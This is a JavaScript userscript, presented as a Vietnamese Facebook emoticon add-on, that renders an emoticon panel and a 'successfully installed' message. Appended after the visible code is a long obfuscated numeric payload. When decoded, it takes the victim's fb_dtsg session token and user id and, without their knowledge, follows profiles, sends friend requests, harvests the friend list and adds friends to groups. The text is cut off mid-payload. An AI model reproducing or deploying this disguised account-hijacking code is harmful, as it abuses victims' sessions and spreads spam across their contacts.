	html += '<a class="navLink" title="1 Thông Báo M?i">'; // var navLink
	html += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img></span>';
	html += '</a>';

	
	// Flyout
	html += '<div>'; // openToggler; var flyout
	html += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
	// {

	
	// Beeper
	html += '<div class="jewelBeeperHeader">';
	html += '<div class="beeperNubWrapper">';
	html += '<div class="beeperNub" style="left: 4px;"></div>';
	html += '</div>';
	html += '</div>';

	// Tabs
	// var titleContainer
	html += '<ul style="display: text-align: center;">';
	html += '</ul>';

	// Bodies
	html += '<div>'; // var bodyContainer
	html += '</div>';

	// Footer
	html += '<div class="jewelFooter">';
    html += '<a class="jewelFooter" href="https://www.facebook.com/Erosaka" target="_blank">Chúc M?ng B?n Đ? Cài Đ?t ICON FACEBOOK Thành Công <br>FaceBook.Com</a>';
	html += '</div>';

	// }
	html += '</div>'; // emoticonsPanel
	html += '</div>'; // openToggler

	// }
	html += '</div>'; // fbJewel
	html += '</li>'; // navItem

	var navItem = createElement(html);
	var pageNav = document.querySelector("#pageNav");
	pageNav.insertBefore(navItem, pageNav.firstChild);

	// Maintain active element
	navItem.addEventListener("click", function() {
		if (isInstanceOfTextInput(lastActiveElement)) {
			lastActiveElement.focus();
		}

		openFlyoutCommand = undefined; // Do nothing
	}, true);

	var navLink = navItem.firstChild.firstChild;
	var flyout = navLink.nextSibling;
	var titleContainer = flyout.firstChild.childNodes[1];
	var bodyContainer = titleContainer.nextSibling;

	// Toggle listener
	navLink.addEventListener("click", function() {
		openFlyoutCommand = !isFlyoutOpen(flyout);
	});

	// Picture emoticon tab
	var picEmoTab = createTab(titleContainer, bodyContainer);
	picEmoTab.title.click(); // Default tab
	
	picEmoTab.body.appendChild(createTabListBody(emoticons, function(emoticon) {
		if (emoticon.class === undefined) { // No picture
			return false;
		}

		// [Bug] 2 characters unicode emoticons
		if (emoticon.chars.length == 2) {
			return false;
		}

		return true;

			}));

	// = Other listener =======

	document.addEventListener("click", function() {
		// Get active textarea
		lastActiveElement = document.activeElement;

		// Toggle flyout
		if (openFlyoutCommand !== undefined) {
			openFlyout(flyout, openFlyoutCommand);
		}
		openFlyoutCommand = false;
 	});
})();


	// === Facebook Emoticons ====
var _3016;var _4254='34848E84A131F849C765E833E505C789C797D777E505F621F505E741E533C589C581E597D593C589F577D589B605E605B593B593F589C597B589A605A533A749C613C417F849C765A833E505B785F769C757A777D841E837E789D505A621C505A777E821E773B845F813F781E817C841B741D533E789D781E841B653D809F781F813F781E817F841C837A641B861F689A765E813A781D533D749F537F533A785E769B757F777D841F837F789D533E541F741E569D749A741E533B849B765F809F845C781D533F749D613F417A849F765A833E505B845C837F781F833D757E797E777E505F621F505C777B821A773C845A813E781C817C841A741A533E773B821C821F805E797F781C533C749C741B533A813F765B841A773D793A533F749F537B777F821D773A845E813F781E817E841E741D533C773F821E821B805C797D781E533E749E741B533B813A765B841D773D793A533C749F537F565B773F757E845D837A781E833A621F537B745F777C549D541B565C541D741D573C749E541E613D417B849C765D833E505C793D841A841D825C853C825E505F621E505A817D781C853D505A729D685A681D665F841A841E825E705E781C829D845C781A837A841B537E541C613C417F849A765A833D505C845A833D809D853B825F505A621E505E533C565F765E801A765A857B565B789D833C821D845B825A837F565A813A781C813C769B781C833D837D793A797B825E565F833F577E801D561E825B793B825A629D757E757F765B621C573F533D613D417D849A765C833C505C825F765E833F765A813A837E853D825F505F621F505D533E529D833B781A785E621C789F833E821A845B825C757C801F845F813B825D757D793B781D765B777A781C833A529A789F833A821A845D825A757E797D777D621D533C505A549A505B789C797F777B505F549B505A533A529A785B769C757C777C841A837C789B621D533E505E549D505B785C769B757B777C841C837B789A505B549F505F533E529E757B757A845A837E781D833A621A533C505C549E505F845C837F781C833F757A797A777E505B549B505A533B529F825C793F837D841A765B813C825C621C533A613B417F793B841D841D825A853C825D741A533B821D825A781A817E533E749C537B533C697D693E709D713B533F553A505F845D833F809A853A825D553F505D841D833F845F781B541A613D417A793C841D841C825C853B825E741A533F837B781C841E705B781E829A845D781F837C841E665F781A765A777A781B833A533D749B537F533C645F821A817D841B781C817E841D557B841B861F825F781E533C553B505F533A765F825C825D809B797E773C765E841A797B821A817A565E857D557B853F853E853F557F785D821F833F813D557A845F833D809F781B817A773A821E777C781B777A533D541A613E417D793A841E841E825D853E825B741D533B837F781C841A705A781D829E845C781F837E841F665C781E765E777E781B833F533F749D537E533D645D821E817C841B781E817C841C557C809F781B817A789B841D793F533A553D505B825F765A833E765B813B837B853B825E741B533C809B781C817A789F841D793F533C749C541F613B417B793C841C841F825E853E825F741C533E837E781A841F705C781B829C845E781C837F841C665B781F765C777F781E833D533F749F537F533A645B821E817B817E781C773A841A797B821F817F533C553F505E533E805E781A781A825A557E765F809A797D849B781E533B541E613A417D793D841A841C825F853C825F741A533B837E781C817C777D533B749F537C825A765A833B765E813C837D853D825F541A613E417B505F417B849A765F833F505B785C769A757C777D841F837B789F505E621F505F777B821F773E845C813B781C817D841F741E533B789A781C841F653E809D781D813A781C817F841A837D641E861E689A765C813C781C533F749B537F533B785A769C757B777C841C837A789E533E541E741B569D749D741B533F849E765B809B845F781E533D749B613F417A849D765B833A505F845F837E781E833C757E797F777E505A621D505D777D821D773C845A813E781E817C841A741F533E773F821A821E805C797C781C533D749A741A533A813F765C841A773D793E533F749D537E777A821D773B845E813B781A817C841F741D533A773A821B821F805A797E781E533C749F741C533E813F765C841F773E793D533A749D537F565A773B757F845E837F781D833C621B537D745D777F549F541A565F541D741E573A749C541E613C417F505E417A849A765A833E505B785F833C797E781A817D777E837E505D621C505A817F781A853A505F637C833E833D765A861F537E541A613B417E789F785B505D621B505B817B781A853A505D729D685C681D665C841F841E825B705E781F829B845D781D837C841A537C541F613E417F789F785C741B533D821A825A781C817F533A749F537C533B661C653E713A533D553B505F533A565C765F801B765B857A565F841D861B825F781D765A793C781E765F777E565E785E797C833A837D841F757A777B781B789C833B781D781D561B825E793B825E629D757D757B765D621B573B529B849A797F781B853B781C833F621C533D505A549C505E845E837F781D833A757B797C777E505F549C505C533F529A841B821D805C781E817B533C505D549A505E685D765E841B793C741D533C833C765C817D777C821E813C533B749E537B541F505F549F505B533A529E785C797C809E841E781E833F741A569E749C621A845F837D781D833A529E821D825B841C797F821E817F837F741E569F749A621C785A833C797E781D817C777B837B757C821D817E809A861B533E553F505F785A765A809C837F781F541E613F417E789D785F741D533B837D781A817A777E533B749D537B541C613E417F797A785E505D537E789F785F741E533D833A781E765F777E861E709E841A765F841D781F533F749E505F509B621B505E585A541F505F869A877B505A781A809B837E781A505C869B417F505B505B505C505E777E765B841A765E505A621A505B781B849B765E809F537F533E537E533D505B549B505E789A785A741D533D833F781A837E825C821C817D837A781E713E781C857A841C533A749D741F533D837C845F769F837A841D833D533F749E537F605B541F505A549D505E533A541B533D541D613A417E505E505F505F505B797B785B505D537A777A765F841E765D741D533B781B833A833D821A833C533D749E541C505B869E877D505A781D809F837C781F505D869F417E505E505F505A505B505E505E505C505D785F833A797B781B817B777C837C505A621F505A777E765C841C765D741C533D825E765C861B809A821A765B777C533A749D741E533B781D817E841F833A797C781E837A533C749A741F533D837A821E833C841B533F749F537A785A845E817A773F841C797D821F817E505B537F757D569B857F605B581A777D765B857A601E553E505D757E569B857B605D581A777C765E857C605B541E505E869F417C505E505C505F505F505E505C505A505D505E505F505F505C833D781F841F845E833C817B505A757A569F857D605D581E777B765F857E601D741B533F797A817B777C781E857E533F749D505F557E505B757D569B857D605F581F777E765B857B605F741B533A797B817D777B781E857D533B749C613B417C505D505C505D505B505C505D505A505F877E541F613C417D505A505E505F505C877E613A417D877D613B417C505E417F785F821E833E505F537C849B765D833C505E797B505E621B505B569E613B505E797C505C617A505F785E833B797B781E817D777C837B741A533B809D781A817D789B841B793B533F749C613A505C797C549F549A541D505E869F417D505C505B505A505E849D765E833D505A793E841A841E825A853F825B505C621D505F817D781C853A505A729E685E681A665E841D841E825C705F781C829E845F781D837A841B537D541F613F417B505E505C505E505F849B765F833B505F845E833B809B853C825B505B621D505C533C565F765E801F765C857B565F789C833E821E845E825C837A565A813E781E813F769D781D833C837C565A765E777C777D757D825A821D837E841D561D825F793F825B629C757A757E765C621F573A533A613D417A505F505F505E505E849D765B833C505E825F765C833E765D813F837D853B825B621F505D533B529E785E769F757A777B841C837A789C621E533B505F549C505F785A769F757B777E841D837C789F505B549D505D533C529B789D833F821D845D825D757D797C777A621C533E505D549A505D789F797F777B505E549B505F533D529A837D821A845F833D773E781F621F841D861B825A781A765A793D781C765F777B529C833F781F785C621C529C813B781C837F837E765C789D781C757B797B777E621B529B813A781F813B769D781C833D837E621D533B505E549D505A785A833E797D781D817E777F837D741A797F749D741A533B845F797B777F533B749C505C549F505E533F529A757E757B845B837F781C833E621F533B505B549C505A845D837C781D833D757C797C777A505E549B505F533D529C825B793E837B841F765B813E825A621D533D613C417D505B505E505C505E793A841F841F825B853F825D741A533D821A825F781D817B533B749A537E533E697D693A709E713B533A553E505F845B833A809F853D825C553A505D841A833F845B781E541E613F417D505B505D505A505F793D841B841F825C853B825E741E533E837E781C841B705A781C829C845F781F837B841A665F781A765D777D781A833B533C749F537E533C645B821B817C841D781B817C841B557E841F861D825D781A533D553E505A533E765C825E825F809B797D773B765B841A797C821E817D565E857C557B853E853A853F557A785E821A833F813F557A845B833F809C781F817F773C821B777E781B777A533A541F613B417E505C505D505A505E793C841C841C825B853C825D741C533F837F781F841B705B781E829E845B781F837E841B665C781E765F777F781C833B533D749F537C533A645A821C817E841D781F817F841B557C809C781E817A789D841D793F533E553C505A825B765F833B765D813D837C853D825F741F533E809F781A817E789E841A793C533A749F541C613E417E505F505D505D505E793D841B841B825D853D825A741A533E837E781F841C705E781E829F845D781F837B841E665C781E765B777E781C833C533C749B537F533B645F821D817A817E781F773F841F797A821C817C533F553D505A533A805A781B781F825E557F765A809C797C849A781F533B541E613A417A505E505A505E505A793F841F841C825E853B825E741D533A821E817E833E781A765A777D861E837D841F765F841E781B773B793B765A817F789D781A533C749F505D621F505E785D845D817B773A841D797F821D817A505C537F541D505A869E417A797C785D505F537E793E841D841A825F853D825F741E533E833A781B765E777F861F709B841D765D841B781F533B749E505B621D621C505F585A505A529D529D505A793F841E841A825B853B825C741F533D837A841D765A841E845C837F533B749B505D621E621E505E577C569E569A541F505D869F877F613C417B505F505E505C505F877D613E417B505D505C505D505B793F841D841A825E853D825B741B533F837A781C817B777B533B749A537F825B765B833D765E813B837A853A825E541E613B417C877E417C505C417B505C417F565D565A765D833A805B765F777F765A837A809B765B833B797B505B765C809F505C849D781E505B797C837A809C781D417E785F845C817C773F841F797C821C817C505A837D765E833C805C765A777D765A837A809B765D833C797B757A765C809F537D541A869C417B505C505E505A505A505C505B505A505D505F505C505E505E505A505D505A505B849D765C833A505F857A813C809D793D841F841D825B505E621F505C817D781D853F505A729F685A681D665A841D841C825E705E781A829B845E781D837F841C537E541F613A417A505B505B505A505F505C505C505C505E857F813E809C793F841E841A825B561F821B817A833B781E765F777C861A837B841B765D841F781D773F793E765F817B789D781E505D621B505F785A845D817E773C841A797A821C817A505A537E541A505E869D417F505A505B505F505C505E505E505C505B505E505F505A505C505A505E505A505D505C505E505C505C505E505B505B505E797C785C537E857A813D809C793E841C841A825E561E833C781F765E777F861D709C841B765B841E781B505D621C621A505C585A541E869C417E505D505F505E505D505D505E505D505A505B505A505F505E505A505B505B505F505D505D505C505C505E505E505C505E505D505B505F505A505D505A505E505E505D505E781E849B765E809D537C513C765D833C805F765A777B765C837E809F765C833C505D621D505F513B505E549A505C857C813A809B793A841A841D825B561B833A781D837A825F821A817E837E781E713B781D857D841B561F841E821F709C841A833E797F817D789A537D541D561C833A781A825E809A765B773B781A537D513A785F821B833C505A537B613B613F541F613A513D553E513E513C541E505E549C505D513B613E513C541C613B417A505D505D505A505C505A505D505E505F505A505F505F505E505C505F505E505C505F505C505A505B505B505A505A505B505D505D505E505A505C505E505F505C505C505C785B821F833C537E785C621A569D613E785A617C685C765C841E793B561F833B821E845C817D777D537C765C833E805E765A777C765E837D809E765B833F561B825F765B861D809C821D765E777B561A781F817B841A833F797C781F837C561C809B781B817D789E841C793E565F573F569D541F613B785C549F549C541A869B417D505B505F505C505F505E505F505F505E505A505D505E505F505E505F505B505B505F505F505B505A505D505D505D505B505C505E505F505A505C505B505F505A505F505E505E505D505A505F505B505E837F813D781F837C765A801F505F621D505F513E513F613E417F505C505C505A505E505F505B505A505B505E505E505C505A505A505F505C505A505E505B505D505F505A505E505F505F505C505A505F505D505E505F505A505D505E505A505A505B505E505D505E505B837C813C781C837B765B801D757D841A781E857E841C505A621E505B513D513B613F417B505D505F505C505E505C505C505B505A505A505A505D505F505F505F505E505F505C505E505D505E505B505D505E505F505B505C505B505C505D505E505C505B505A505E785A821F833F537E797D621F785E545F573A569F613B797C617F537D785F549F573E541B545B573C569A613C797E549C549A541A869A417E505F505B505B505F505D505D505A505E505E505D505A505D505C505F505C505B505F505B505F505D505D505A505F505C505E505E505C505C505B505A505C505A505D505F505F505D505C505A505C505F797E785D537E765D833F805D765E777A765F837E809F765E833D561D825E765F861C809D821D765A777F561D781D817A841C833F797F781B837E741E797E749B541D869A417C505B505F505A505C505D505D505B505C505F505E505F505F505E505E505D505A505D505B505D505E505D505C505F505A505F505E505A505C505F505F505E505B505C505F837A813A781A837F765D801C505D549C621A505D513B505B633E741C513E505B549C505B765F833A805C765D777B765B837B809F765B833B561F825C765A861D809D821E765D777B561B781A817B841A833A797D781E837E741F797D749C561D845C797C777B505E549A505C505A513E609A513F505C549F505F765F833B805E765A777D765C837F809C765E833C561A825D765F861E809B821E765C777D561D781C817D841D833D797E781D837B741F797A749A561A841E781B857A841E505F549C505D513C749D513D613C417E505C505F505F505A505C505A505F505A505B505D505C505B505C505C505D505C505A505D505A505E505C505A505D505C505A505C505F505D505A505D505C505A505A505A837E813C781D837E765F801C757F841D781B857C841E505D549E621B505F513D505A513B505F549F505E765F833B805D765F777B765B837B809E765E833A561D825E765C861D809A821C765A777A561E781F817D841B833B797E781E837A741B797A749E561B841A781D857D841F613D417F505F505F505C505D505E505E505B505F505A505E505B505B505A505A505A505B505C505A505C505D505A505A505A505E505B505F505F505E505D505D505F505D505F505E877A417A505D505C505E505F505E505F505D505D505A505E505E505B505E505B505F505C505C505E505F505F505B505F505B505F505A505A505D505C505F505D505B505D505C505C505D505B505D505E505A505A877F417D505C505F505A505F505A505F505D505F505A505F505D505E505A505D505E505B505E505D505E505C505D505A505F505D505B505B505B505C505F505D505F505F505A505A505B505B505B505E505A505E837B777E845C833F845D813B825F765C861C809A765D837B537E541A613F505B505F505B505A505B505B505F505A505B505F505A505C505F505B505A505A505F505C505D505F505D505A505A505F505B877B417C505E505A505A505B505C505A505D505D505A505A505E505E505C505D505E505F505F505E505A505E505A505C505F505C505F505A505E505E505E505A505F417D505B505B505A505E505E505C505B505A505E505C505C505F505E505C505D505A505A505B505F505A505E505E505A505C877A417C505D505E505E505F505F505C505D505C505E505F505B505A505C505A505D505A505F505B505F505B505F505C505E417B505C505D505A505C505D505D505A505D877B613B417B505F505D505C505A505C505D505A505D505C505E505F505D505C505C505A505E849B765A833C505B825A765D833A765B813E837F505B621F505D513F529E785A797E809E841D781A833E741A569D749C621E845B837B781A833D513B613F417C505A505E505A505C505E505B505D505F505F505C505D505A505A505C505C505E825F765A833D765A813D837B505F549A621E505B513F529E821B825C841C797C821F817C837E741F569E749B621E785C833A797E781E817F777B837F757A821D817A809F861E513F613F417D505B505C505E505A505F505E505E505F505E505B505C505D505F505A505B505A825A765C833A765A813D837B505E549B621E505B513C529C821B825C841F797D821A817A837A741B573A749D621E817A813F513A613F417A505D505F505D505D505D505E505D505A505B505F505F505E505D505D505C505A825E765F833B765C813A837E505E549C621F505F513A529E841E821E805B781A817F621E849F597D513A613F417A505A505B505A505D505E505B505E505C825B765C833D765E813E837C505E549F621A505F513A529E849F797C781A853C781C833C621C513F505B549B505E845B837A781B833E757F797C777E613D417D505A505E505E505F505C505B505A505D505B505D505D505C505F505F505E505E825F765D833E765F813D837A505E549C621A505D513C529A757D757E845C837E781E833D621D513A505D549D505C845A837C781E833D757D797F777B613F417C505C505E505A505B505B505A505E505C505A505B505E505A505F505F505B417B505D505A505E505B505D505D505E505B797A785D505F537C777A821D773C845C813B781D817F841D561E717E705D681A561F797E817E777B781B857F693F785A537C513A793B841D841B825C837F609A565A565C513A541D505D625F621A505C569F541D505E869A505E857E813A809C793A841A841F825F561E821F825D781D817C537E513A661D653B713C513F553D505C513F793E841E841C825B837A609B565B565C853F853D853E561D785C765C773F781C769C821A821A805D561F773D821C813E565F765D801A765A857F565A841F861E825B781C765E793A781E765A777D565B785A797F833C837A841A757E777B781C789C833C781B781B561C825E793A825A629A757C757F765F621C573A513F505C549B505B825D765D833C765C813E837A553B505D841F833C845C781C541D613B505D877B417E505C505E505F505A505E505B505D505C781F809A837D781F505F869F505F857C813E809E793A841E841A825E561A821F825A781E817F537E513F661B653C713E513D553C505B513D793F841D841C825A609F565F565E853E853E853C561C785E765B773A781E769B821C821D805C561E773F821D813B565F765F801B765F857F565E841C861A825A781E765D793B781C765B777D565D785E797B833E837D841D757C777A781A789C833D781A781A561A825F793F825A629E757E757C765E621B573A513C505A549B505A825A765C833B765C813B837A553F505E841B833F845E781F541E613C505F877A417A505F505C505F505A505B505F505E505C857E813A809C793F841B841D825A561A837E781C817B777F537E541F613B417F877D417F505F417C565A565A841A797A805F809A765F813D765C505A821A809C765E861B797A817F797B505E777C797F817E809F781A417C849C765E833D505F841F797E805D809E765A813D765B505B621E505C777D821A773C845B813F781E817F841B561B765C777D777A653B849F781C817E841B681E797C837F841F781E817F781C833F537F513E773B809D797A773D805A513B553F505D785A845A817D773D841F797B821F817E505A537A541F505D869F417F797A785D537D777E821D773F845F813A781D817A841B561F773A821D821A805D797D781E561C837D825D809D797B841C537D513A825B765C861B809A765E837B841B797F621F513D541C741A573F749A561A837F825F809A797D841D537C513B613C513A541C741A569B749B561A797D817F777C781B857B693A785B537B513C793E765A861D797F833F513C541D505E625C621B505D569D541A869B417F837F849C817C757A833D781B849E505C621E505C777B821C773B845A813A781D817A841C561A793F781F765E777C561E797A817D817A781F833A665C713B685E681A561C837F825E809D797E841C537F533C513C837A849A817D757C833A781D849A513A609C533D541C741E573B749E561C837D825D809F797A841D537D513A553E513E541E741C569E749E613B417D837D765E833E805D765F777F765C837D809E765D833A797C757F765C809C537B541D613C417C777D821B773A845B813F781C817C841D561A773E821D821B805D797D781D505B621F505F513B825C765F861A809A765A837D841E797A621F781B849B781F841A613C781A857B825F797D833B781A837B621B513E549D505E769A841D765D833B797B793D797B561D841F821D661D685E713E709E841B833E797E817D789B537B541F613F417C505F417D777F821B773D845C813A781C817C841F561E833F781D813A821D849D781D653A849F781D817E841B681F797E837D841E781A817C781D833C537F841C797A805F809A765B813C765D541F613F417C877C417B505C877C553D505A785D765B809E837D781C541E613E417A505C417E505F417D565A565B765F833A805A765E777F765B629B1137E505C781B805C809F781C813B781C417B785F845E817C773B841E797B821E817D505D837F765D833D805D765A777B765C837F781B805D809D781E537C845C797F777D553E773A797B817A837D541D869A417C505A505C505A505A505E505D505E505C505A505C505E505B505F505D505F505F849A765B833E505F857A813F809F793E841A841C825B505B621D505B817D781D853B505E729C685E681A665A841F841D825D705A781F829F845F781A837B841F537A541F613B417F505D505B505B505C505E505E505C505D857A813F809A793C841B841B825D561A821E817A833D781D765E777C861C837E841F765A841F781D773B793C765E817C789C781F505A621D505F785F845C817F773E841F797C821F817B505A537C541C505E869F417F505E505F505B505A505C505A505E505E505F505D505D505E505F505A505A505A505D505C505F505F505C505E505C505A797B785D537C857F813E809E793D841D841F825A561C833A781F765C777A861B709D841D765B841A781E505A621E621F505F585C541D869C505E505D417C505A505D505A505E505C505D505B505B505A505B505B505F505F505D505A505D505E505B505B505B505A505D505D505B877A417F505F505D505C505D505B505B505F505C877C613A417E505F505D505B505E505E505D505D505C505F505A505E505B505F505F505F417B505F505E505E505D505B505F505A505E505B505C505D505E505C505D505B505F857F813B809D793E841E841C825C561F821C825C781A817B537E513F697D693F709B713B513B553C505C513A565B765B801F765A857A565B765B777C777F757D785B833B797C781B817C777A565F765F773F841A797D821D817B561E825B793A825E629F757C757D765A621A573C513C553F505B841B833A845C781B541B613C417D505A505E505C505F505A505E505A505C505B505F505C505B505C505C505D505F849A765D833E505F825A765F833C765D813B837A505B621B505F513B841A821E757C785F833C797B781D817A777B621D513C505E549A505F845F797D777D613F417E505D505D505D505F505E505C505D505E505E505B505A505C505E505F505A505B825B765D833B765D813A837D505E549A621A505C513E529C765A773F841A797B821F817B621C765E777F777B757B785A833F797E781A817C777D513C613C417D505C505C505B505C505B505A505F505E505D505D505C505E505B505D505E505E825E765B833D765B813F837F505D549A621C505D513A529B793E821A853E757E785F821D845D817E777F621F785F833E797A781B817B777B757B769D833A821D853F837B781C833B513A613D417C505C505C505E505E505E505C505F505A505B505B505A505F505A505F505B505E825B765F833C765A813E837D505B549C621C505D513B529A833C781B785D757E825A765A833C765A813D621E817B821D817B781F513C613C417E505E505E505D505A505B505B505B505A505E505C505F505E505A505F505C505E825D765B833D765C813B837B505D549B621C505C513E529B821B845E841A789B821D797B817B789A757F797D777C621A513E613D417B505F505B505D505C505C505E505E505D505A505B505A505E505C505C505C505D825A765E833F765E813E837E505C549E621C505C513B529F809F821C789E789D797C817F789C757C809D821C773F765C841D797B821D817F621C785E833F797E781F817F777D757D769E833F821E853D837B781E833B513B613A417F505C505B505C505A505C505A505E505A505C505A505A505A505B505A505C505C825B765A833A765C813A837F505A549A621C505A513B529B817D821C757B785C809B861F821D845A841F757A821E817A757C773B809D797B773D805C621A841C833F845D781E513D613C417E505F505E505A505B505F505E505C505F505A505E505A505F505C505A505E505E825B765A833E765E813C837A505F549B621A505E513B529A781D789B821C757B809A821E789B757C777A765B841E765B621A513D613C417A505C505D505C505A505A505D505B505D505E505E505C505A505E505E505D505E825C765F833D765E813A837E505B549E621D505E513A529F793F841B841E825C757B833A781B785F781A833F781F833D621C513A613C417D505A505F505A505F505E505E505A505B505E505F505F505E505C505C505E505C825C765C833D765F813C837C505B549C621B505B513E529D785D769A757E777C841D837E789B621F513F505F549E505C777A821A773D845B813E781A817B841F561D789C781D841A653D809B781F813D781F817B841D837B641F861E689D765B813B781C537C533D785D769E757A777E841E837E789F533B541E741F569F749F561C849A765A809B845B781E613D417A505E505B505B505F505E505D505D505D825C765A833C765C813C837B505A549B621A505F513C529A825C793E837F841B765E813D825F621A573F593A589B601D573C593C597A585D605C573F573C585E601B585C601A581B593C605E573E573A589D513C613D417C505D505B505F505D505A505F505E505B505E505E505F505D505C505C505A505D825F765E833D765A813D837B505F549E621A505B513C529D757A757B845F837D781A833A621B513B505A549D505A845A837D781C833C757C797F777A613A417A505E505F505D505B505F505D505B505D505A505A505C505C505C505D505F417C505B505D505D505F505E505F505C505E797D785E505B537C777B821D773B845F813E781E817B841D561C717A705C681E561A797B817B777F781C857D693D785E537A513F793E841C841C825C837A609B565F565C513B541F505A625A621B505C569C541E505A869C505E857B813D809E793C841A841B825D561C821F825D781C817E537C513D661F653D713F513D553C505B513C793F841D841D825D837A609C565E565E853F853D853A561B785B765E773A781E769D821A821A805B561C773B821C813A565C765B801E765F857A565B841A861D825A781C765F793F781B765E777A565F785C797F833F837A841B757F777B781D789F833D781B781C561C825C793C825B629F757B757D765B621B573A513B505C549D505C825C765F833D765E813F837D553C505E841B833A845E781F541B613C505B877B417D505C505D505A505E505A505B505C505C781F809C837B781E505D869B505C857E813B809E793C841A841A825D561B821A825D781C817A537E513C661A653F713B513A553E505A513F793C841C841C825C609A565C565F853A853E853D561B785A765C773B781C769C821B821D805A561F773E821B813B565F765E801D765E857C565F841B861F825B781F765C793E781A765E777D565C785C797E833C837C841D757D777F781F789C833C781E781A561E825C793B825B629F757C757C765B621E573F513F505A549A505D825E765C833D765C813E837E553E505A841F833D845F781D541E613F505B877C417A505C505C505B505D505F505C505D505D857B813D809C793A841A841C825B561C837B781E817F777A537E541A613C417C877B417C505C417A565C565E841E797D805E809B765A813E765B505A821D809E765C861D797E817E797C505A777A797B817D809A781E417D849A765A833D505E841E797A805C809F765A813E765C505F621D505B777A821E773D845C813E781C817C841D561C765B777B777A653C849D781D817D841A681D797F837B841C781D817E781C833C537F513C773B809A797A773C805F513E553C505F785D845F817E773D841E797D821A817B505B537C541E505A869B417D797C785B537B777B821E773C845B813F781A817A841B561D773C821D821F805D797D781E561E837E825A809A797D841D537E513F825C765C861B809D765B837A841F797C621D513D541D741D573D749E561D837A825C809A797B841B537B513E613E513D541E741F569F749E561F797E817F777D781F857D693E785F537A513D793E765A861A797D833B513E541E505D625E621C505C569D541D869B417F837E849A817A757E833A781F849B505D621E505E777C821E773F845B813B781C817A841C561C793F781B765C777B561B797E817A817C781E833C665F713B685A681C561C837F825A809B797C841C537E533E513B837E849E817F757B833A781A849C513E609C533A541A741E573F749B561D837B825A809E797B841A537F513D553C513F541F741A569B749F613E417B837D765A833F805D765C777A765F837B809D765C833A797A757D765C809E537B541B613E417C777D821B773B845B813E781D817B841C561B773F821A821F805E797D781B505C621E505B513A825D765E861B809A765B837B841C797B621F781E849C781F841A613B781F857C825D797B833B781A837E621F513A549D505C769C841C765C833D797D793C797D561D841B821A661C685A713B709E841B833B797D817F789B537E541D613B417C505A417D777D821C773B845C813A781D817D841F561D833D781C813C821A849D781D653F849F781B817E841A681E797D837F841E781A817D781F833B537C841D797E805A809C765B813E765B541D613D417A877E417B505D877F553F505B785C765C809A837F781B541B613B417C505E417E505C417A565D565E765F833B805A765F777A765A629E1137E505D781D805F809E781B813B781A417B785E845E817B773E841D797B821E817F505A837C765B833C805C765F777A765F837E781B805A809A781E537B845B797E777F553C773D797B817B837D541F869D417D505E505D505F505A505A505D505E505E505A505B505B505C505C505E505E505E849D765B833A505F857F813F809B793C841D841E825E505A621E505E817E781E853C505F729F685F681C665F841C841F825F705F781F829E845D781E837D841A537C541B613D417B505E505C505D505E505B505F505B505D857D813A809C793F841B841E825A561D821B817E833C781F765E777B861E837D841F765E841A781C773C793F765D817C789E781E505F621C505F785A845A817C773C841C797A821D817B505A537A541E505E869A417B505D505E505C505C505C505F505E505A505A505A505B505C505D505C505C505C505A505D505C505B505E505B505B505D797B785F537E857B813C809F793B841A841E825D561C833E781A765C777E861D709D841F765A841C781F505C621D621D505A585F541A869C505F505E417C505B505E505F505C505D505A505A505B505B505F505E505B505B505A505D505D505F505F505D505F505C505D505D505B877C417E505C505C505B505E505D505A505A505F877F613F417E505A505A505C505E505D505C505D505B505F505E505A505B505E505C505E417E505D505B505A505B505C505E505A505D505C505A505E505B505C505E505E505E857C813D809C793D841D841D825E561F821A825D781C817B537B513A697E693E709B713B513F553D505E513E565A765B801A765D857D565C765C777D777F757F785D833E797A781D817B777C565A765D773B841A797A821E817D561C825A793A825A629B757F757E765A621F573F513F553E505D841D833A845C781A541A613F417D505C505A505D505D505A505F505C505E505F505D505C505E505E505E505A505B849A765E833F505B825B765B833A765A813D837D505D621B505F513C841B821E757C785D833C797E781B817D777E621F513F505C549B505A845C797F777D613E417F505F505C505A505A505B505C505F505C505C505F505A505D505E505C505F505F825C765B833E765D813C837F505C549A621E505D513D529B765A773F841D797C821A817B621D765F777A777B757F785A833E797B781D817E777E513D613C417B505E505D505C505A505C505F505E505E505C505A505E505D505A505E505D505D825A765A833B765F813C837D505D549B621A505E513F529A793F821E853A757E785D821B845F817F777B621A785C833E797B781D817B777F757E769D833D821F853C837A781B833E513E613D417F505C505D505F505F505D505D505A505D505A505E505B505D505C505E505B505E825A765A833E765B813E837A505B549A621B505B513B529A833D781B785D757C825A765F833E765B813F621F817C821F817B781E513A613B417E505D505E505B505A505C505E505D505D505C505D505D505F505E505C505C505C825B765E833A765C813E837A505D549F621B505C513D529B821F845D841F789C821A797B817F789E757C797D777B621A513E613F417F505E505B505F505A505C505D505F505A505A505C505A505F505B505B505E505E825D765A833B765D813A837F505A549E621A505F513E529E809A821F789F789D797B817B789C757F809A821A773D765E841E797C821F817E621C785C833B797F781D817A777A757F769F833D821B853D837A781C833B513A613D417B505E505A505F505B505B505C505C505D505A505F505E505E505A505C505D505F825E765B833E765B813B837E505B549F621C505D513E529F817A821E757E785F809A861D821D845C841E757C821E817D757D773B809B797E773D805F621B841A833B845B781A513B613D417E505C505C505E505B505C505A505D505F505E505D505D505C505D505C505F505A825F765A833F765A813F837B505A549F621E505A513F529D781C789B821A757D809E821A789E757B777D765F841A765E621C513F613E417C505E505A505C505C505A505F505D505E505A505C505D505E505D505E505F505C825E765B833E765A813C837E505B549D621F505A513D529A793D841C841D825C757A833F781E785C781A833E781D833B621A513F613F417E505D505D505C505D505B505B505C505D505D505C505C505C505E505F505A505B825B765D833E765C813A837B505D549C621D505E513C529E785B769F757F777F841F837C789C621C513A505E549F505F777B821D773A845F813A781F817F841B561F789A781D841B653D809C781D813C781D817D841D837D641D861C689E765E813D781D537C533A785A769E757B777F841A837A789C533B541B741C569D749B561A849D765C809B845F781E613F417C505E505D505F505D505B505A505A505B825B765F833A765A813C837B505D549B621D505F513F529A825D793E837F841E765B813A825B621B573C593E589C601A573E593A597E585D605D573B573B585E601C585C601D581D593E605A573B573D589D513E613D417E505C505B505D505A505E505F505A505B505F505A505A505F505A505D505F505B825D765F833C765A813A837A505C549A621C505B513A529B757E757F845E837B781A833B621D513A505D549B505A845C837E781E833E757D797D777F613B417C505D505E505B505C505A505E505B505B505D505E505A505B505B505D505E505F857E813E809F793B841A841D825E561D837F781F841D705E781D829F845E781D8